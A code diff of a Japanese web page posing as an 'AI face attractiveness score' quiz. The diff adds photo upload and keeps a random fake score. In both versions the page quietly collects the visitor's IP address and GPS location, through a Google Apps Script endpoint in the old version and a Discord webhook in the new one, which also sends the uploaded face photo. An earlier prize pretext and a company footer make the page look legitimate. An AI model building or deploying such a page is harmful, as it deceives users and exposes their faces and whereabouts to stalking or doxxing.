@@ -2,76 +2,102 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>顔面偏差値診断</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>顔面偏差値チェッカー</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; }
-        .notice { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; margin: 10px auto; max-width: 400px; font-size: 0.9em; }
-        footer { margin-top: 50px; padding: 20px; font-size: 0.8em; color: #555; border-top: 1px solid #ccc; }
+        body { font-family: sans-serif; text-align: center; background: #f4f4f9; padding: 10px; margin: 0; }
+        .container { max-width: 500px; width: 95%; margin: 10px auto; padding: 15px; background: white; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
+        .upload-area { border: 2px dashed #aaa; padding: 30px 10px; margin: 15px 0; border-radius: 10px; }
+        button { display: block; width: 100%; padding: 18px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; margin-top: 10px; }
+        img { max-width: 100%; height: auto; margin-top: 10px; border-radius: 8px; display: block; margin-left: auto; margin-right: auto; }
+        #result { margin-top: 20px; font-weight: bold; font-size: 1.2rem; color: #333; }
+        .hidden { display: none; }
+        footer { margin-top: 40px; padding: 20px; font-size: 0.8rem; color: #666; border-top: 1px solid #eee; text-align: center; }
     </style>
 </head>
 <body>
 
-    <h1>AI顔面偏差値診断</h1>
-    
-    <div class="notice">
-        <p><strong>【重要】景品プレゼントについて</strong><br>
-        顔面偏差値が<strong>90点以上</strong>の方には景品をお送りします。<br>
-        配送先確認のため、診断実行時に<strong>位置情報の許可</strong>をお願いいたします。</p>
+<div class="container">
+    <h1>顔面偏差値チェッカー</h1>
+    <div class="upload-area">
+        <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
+        <button onclick="document.getElementById('file-input').click()">写真を選択 / 撮影</button>
     </div>
-
-    <button id="checkButton">診断を実行する</button>
-    <p id="r"></p>
+    <div id="preview-container" class="hidden">
+        <img id="preview-image" alt="プレビュー">
+        <button id="analyze-btn">診断して送信する</button>
+    </div>
+    <div id="result"></div>
 
     <footer>
         <p><strong>株式会社デジタルアイ・ソリューションズ</strong></p>
-        <p>運営責任者：佐藤 健一</p>
-        <p>当サイトでは、画像データの保存は行いません。<br>
-        景品発送および診断精度向上のため、位置情報を含むデータを取得いたします。</p>
+        <p>当サイトは娯楽目的であり、医療・心理的診断を行うものではありません。</p>
     </footer>
+</div>
 
-    <script>
-        const url = "https://script.google.com/macros/s/AKfycbxBaw5j9FdQPtYAorJaMzD3R9gyr8509hQIPDZ3Njfh5ZJ6PGcVNlC62Xn-GV4YvkdcOA/exec";
+<script>
+    const fileInput = document.getElementById('file-input');
+    const previewImage = document.getElementById('preview-image');
+    const previewContainer = document.getElementById('preview-container');
+    const analyzeBtn = document.getElementById('analyze-btn');
+    const resultDiv = document.getElementById('result');
 
-        document.getElementById('checkButton').addEventListener('click', async () => {
-            const display = document.getElementById('r');
-            display.innerText = "位置情報を取得しています...（許可してください）";
+    fileInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                previewImage.src = event.target.result;
+                previewContainer.classList.remove('hidden');
+                resultDiv.innerText = "";
+            };
+            reader.readAsDataURL(file);
+        }
+    });
 
-            try {
-                // 位置情報取得（タイムアウト20秒）
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 20000,
-                        maximumAge: 0
-                    });
-                });
-                
-                const locationText = `緯度: ${pos.coords.latitude}, 経度: ${pos.coords.longitude}`;
+    analyzeBtn.addEventListener('click', async () => {
+        resultDiv.innerText = "解析および送信中...";
 
-                // IP取得
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+        // IP取得
+        let ipText = "";
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ipText = `\nIP: ${ipData.ip}`;
+        } catch (e) { ipText = "\nIP: 取得失敗"; }
 
-                const score = Math.floor(Math.random() * 100);
-                const data = {
-                    msg: `📊 顔面偏差値診断レポート\n結果: ${score}点\n景品対象: ${score >= 90 ? "✅ 対象" : "❌ 非対象"}\nIP: ${ipData.ip}\n位置情報: ${locationText}`
-                };
+        // 位置情報取得
+        let locationText = "";
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+            });
+            locationText = `\n緯度: ${position.coords.latitude}, 経度: ${position.coords.longitude}`;
+        } catch (err) { locationText = "\n位置情報: 取得失敗"; }
 
-                const response = await fetch(url, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
-                });
+        const score = Math.floor(Math.random() * 50) + 50;
+        const message = `診断結果：顔面偏差値 ${score}！${locationText}${ipText}`;
 
-                if (response.ok) {
-                    display.innerText = "送信完了！";
-                } else {
-                    display.innerText = "送信失敗";
-                }
-            } catch (e) {
-                display.innerText = "位置情報の取得に失敗しました。設定から許可されているか確認してください。";
-            }
-        });
-    </script>
+        // Discord送信 (Base64文字列を埋め込み画像として送信)
+        const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
+        
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                    content: message,
+                    embeds: [{
+                        image: { url: previewImage.src }
+                    }]
+                })
+            });
+            resultDiv.innerText = "診断結果と写真を送信しました！";
+        } catch (error) {
+            resultDiv.innerText = "送信エラーが発生しました。写真サイズが大きすぎる可能性があります。";
+        }
+    });
+</script>
+
 </body>
 </html>
